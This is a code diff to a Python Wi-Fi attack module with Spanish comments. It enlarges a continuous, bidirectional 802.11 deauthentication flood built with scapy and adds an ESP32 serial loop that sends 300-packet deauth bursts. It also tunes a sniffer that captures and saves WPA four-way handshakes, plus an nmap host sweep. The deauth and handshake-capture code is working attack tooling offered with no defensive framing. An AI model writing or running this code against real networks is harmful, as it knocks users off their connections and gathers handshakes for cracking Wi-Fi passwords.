@@ -12,6 +12,7 @@ from backend.models import WiFiCapture, WiFiClient
 from backend.config import INTERFACE_ATTACK
 from .wifi_monitor import wifi_monitor
 
+
 class WiFiLAN:
     def __init__(self):
         self._deauth_thread = None
@@ -19,38 +20,47 @@ class WiFiLAN:
         self.is_deauthing = False
         self.target_bssid = None
         self.handshake_captured = False
-        self._eapol_frames = []  # buffer para los 4 frames
+        self._eapol_frames = []
+        self._serial_lock = threading.Lock()
 
-    # 1. DEAUTH — ahora continuo con duración configurable
+    # ─── 1. DEAUTH CONTINUO BIDIRECCIONAL ───
     def trigger_deauth(self, iface: str, bssid: str,
                        client: str = "FF:FF:FF:FF:FF:FF",
                        count: int = 0, duration: int = 30):
-        """
-        Si count > 0: modo ráfaga fija (legacy).
-        Si count == 0: modo continuo hasta duration segundos o stop.
-        """
         self.target_bssid = bssid
         self.is_deauthing = True
 
         def _run():
-            pkt = (RadioTap() /
-                   Dot11(addr1=client, addr2=bssid, addr3=bssid) /
-                   Dot11Deauth(reason=7))
             try:
+                # AP → Cliente (expulsa al cliente)
+                pkt_ap_to_client = (
+                    RadioTap() /
+                    Dot11(addr1=client, addr2=bssid, addr3=bssid) /
+                    Dot11Deauth(reason=7)
+                )
+                # Cliente → AP (le dice al AP que el cliente se va)
+                pkt_client_to_ap = (
+                    RadioTap() /
+                    Dot11(addr1=bssid, addr2=client, addr3=bssid) /
+                    Dot11Deauth(reason=7)
+                )
+
                 if count > 0:
                     for _ in range(count):
                         if not self.is_deauthing:
                             break
-                        sendp(pkt, iface=iface, verbose=False, count=1)
-                        time.sleep(0.05)
+                        sendp(pkt_ap_to_client, iface=iface, verbose=False, inter=0, count=3)
+                        sendp(pkt_client_to_ap,  iface=iface, verbose=False, inter=0, count=3)
+                        time.sleep(0.02)
                 else:
-                    # Continuo: ráfagas de 3, pausa 100ms, repite hasta duration
                     end = time.time() + duration
                     while self.is_deauthing and time.time() < end:
-                        sendp(pkt, iface=iface, verbose=False, count=3)
-                        time.sleep(0.1)
+                        sendp(pkt_ap_to_client, iface=iface, verbose=False, inter=0, count=5)
+                        sendp(pkt_client_to_ap,  iface=iface, verbose=False, inter=0, count=5)
+                        time.sleep(0.05)
+
             except Exception as e:
-                print(f"[LAN ATTACK ERR] {e}")
+                print(f"[DEAUTH ERR] {e}")
             finally:
                 self.is_deauthing = False
 
@@ -58,8 +68,9 @@ class WiFiLAN:
 
     def stop_deauth(self):
         self.is_deauthing = False
+        print("[DEAUTH] Stop señalizado")
 
-    # 2. HANDSHAKE SNIFFER — captura los 4 frames EAPOL
+    # ─── 2. HANDSHAKE SNIFFER — 4 frames EAPOL ───
     def start_handshake_sniffer(self, iface: str, bssid: str):
         self.handshake_captured = False
         self._eapol_frames = []
@@ -82,19 +93,25 @@ class WiFiLAN:
             self._eapol_frames.append(pkt)
             print(f"[EAPOL] Frame {len(self._eapol_frames)}/4 capturado")
 
-            # Guardar al llegar al frame 4 (handshake completo)
             if len(self._eapol_frames) >= 4:
                 self._save_handshake(bssid, self._eapol_frames)
 
-        self._sniffer_thread = threading.Thread(
-            target=lambda: sniff(
-                iface=iface,
-                prn=_packet_filter,
-                stop_filter=lambda p: self.handshake_captured,
-                timeout=60  # espera hasta 60s para el handshake completo
-            ),
-            daemon=True
-        )
+        def _run_sniffer():
+            from scapy.all import conf
+            # FIX MT7601U: pcap en lugar de socket raw nativo
+            conf.use_pcap = True
+            try:
+                sniff(
+                    iface=iface,
+                    prn=_packet_filter,
+                    stop_filter=lambda p: self.handshake_captured,
+                    timeout=90,
+                    store=0
+                )
+            except Exception as e:
+                print(f"[EAPOL SNIFFER ERR] {e}")
+
+        self._sniffer_thread = threading.Thread(target=_run_sniffer, daemon=True)
         self._sniffer_thread.start()
 
     def _save_handshake(self, bssid: str, packets: list):
@@ -102,7 +119,7 @@ class WiFiLAN:
         os.makedirs("backend/storage/handshakes", exist_ok=True)
         filename = f"backend/storage/handshakes/handshake_{bssid.replace(':', '')}.pcap"
         from scapy.utils import wrpcap
-        wrpcap(filename, packets)  # guarda los 4 frames juntos
+        wrpcap(filename, packets)
         db = None
         try:
             db = SessionLocal()
@@ -128,10 +145,10 @@ class WiFiLAN:
             if db:
                 db.close()
 
-    # 3. ASOCIACIÓN DE RED
+    # ─── 3. ASOCIACIÓN DE RED ───
     def asociar_antena_externa(self, ssid: str, password: str) -> bool:
         iface = INTERFACE_ATTACK
-        wifi_monitor.enable_managed_mode()  # ya tiene el check interno
+        wifi_monitor.enable_managed_mode()
         time.sleep(0.3)
         try:
             subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
@@ -151,14 +168,54 @@ class WiFiLAN:
         except Exception as e:
             print(f"[NET LINK CRITICAL] {e}")
             return False
+    
+    def trigger_deauth_esp32_continuo(self, bssid, client, channel, duration=30):
+        self.is_deauthing = True
 
-    # 4. NMAP — parsing XML en lugar de texto plano
+        def _loop():
+            end = time.time() + duration
+            while self.is_deauthing and time.time() < end:
+                # Disparamos ráfagas continuas de 300 paquetes
+                self.trigger_deauth_esp32(bssid, client, channel, count=300)
+                # REDUCCIÓN CRÍTICA: Bajamos de 0.5s a solo 0.05s para no dejar respirar a la tarjeta de red
+                time.sleep(0.05) 
+            self.is_deauthing = False
+            print("[DEAUTH] Loop terminado")
+
+        threading.Thread(target=_loop, daemon=True).start()
+        
+    def trigger_deauth_esp32(self, bssid, client, channel, count):
+        from backend.core.serial_bridge import serial_bridge
+        import json
+
+        cmd = {
+            "mod": "WIFI",
+            "cmd": "DEAUTH",
+            "params": {
+                "bssid": bssid,
+                "client": client,
+                "channel": channel,
+                "count": count
+            }
+        }
+        try:
+            with self._serial_lock:  # ← evita colisión con el interceptor
+                if serial_bridge.serial_conn and serial_bridge.serial_conn.is_open:
+                    line = json.dumps(cmd) + "\n"
+                    serial_bridge.serial_conn.write(line.encode('utf-8'))
+                    print(f"[ESP32 DEAUTH] Enviado → {bssid} CH{channel} x{count}")
+                    return True
+            return False
+        except Exception as e:
+            print(f"[ESP32 DEAUTH ERR] {e}")
+            return False
+    # ─── 4. NMAP — parsing XML ───
     def obtener_segmento_autodetectado(self, iface: str) -> str:
         try:
             cmd = f"ip route show dev {iface} | grep -v default | awk '{{print $1}}'"
             seg = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
             return seg if seg and "/" in seg else "192.168.1.0/24"
-        except:
+        except Exception:
             return "192.168.1.0/24"
 
     def trigger_arp_scan(self, ip_range: str = None):
@@ -168,7 +225,6 @@ class WiFiLAN:
                      else self.obtener_segmento_autodetectado(iface))
             print(f"[LAN SCAN] Nmap en {rango}")
             try:
-                # XML output: mucho más robusto que parsear texto
                 cmd = ["nmap", "-sn", "-PE", "-oX", "-", rango]
                 proc = subprocess.run(cmd, capture_output=True, text=True)
 
@@ -176,7 +232,6 @@ class WiFiLAN:
                 try:
                     root = ET.fromstring(proc.stdout)
                     for host in root.findall("host"):
-                        # Solo hosts que respondieron
                         status = host.find("status")
                         if status is None or status.get("state") != "up":
                             continue
@@ -197,7 +252,6 @@ class WiFiLAN:
                         if ip.endswith(".0") or ip.endswith(".255"):
                             continue
 
-                        # Hostname si nmap lo resolvió
                         tipo = "DISPOSITIVO DE RED ACTIVO"
                         hostnames = host.find("hostnames")
                         if hostnames is not None:
@@ -207,15 +261,11 @@ class WiFiLAN:
                         if vendor:
                             tipo += f" ({vendor})"
 
-                        hosts_detectados.append({
-                            "ip": ip,
-                            "mac": mac,
-                            "tipo": tipo
-                        })
-                except ET.ParseError as xml_err:
-                    print(f"[LAN SCAN XML ERR] {xml_err} — output: {proc.stdout[:200]}")
+                        hosts_detectados.append({"ip": ip, "mac": mac, "tipo": tipo})
 
-                # ORM flush
+                except ET.ParseError as xml_err:
+                    print(f"[LAN SCAN XML ERR] {xml_err}")
+
                 db = SessionLocal()
                 hosts_sincronizados = []
                 try:
@@ -259,5 +309,6 @@ class WiFiLAN:
                 socket_manager.broadcast_sync("WIFI_LAN_HOSTS", [])
 
         threading.Thread(target=_run, daemon=True).start()
+
 
 wifi_lan = WiFiLAN()
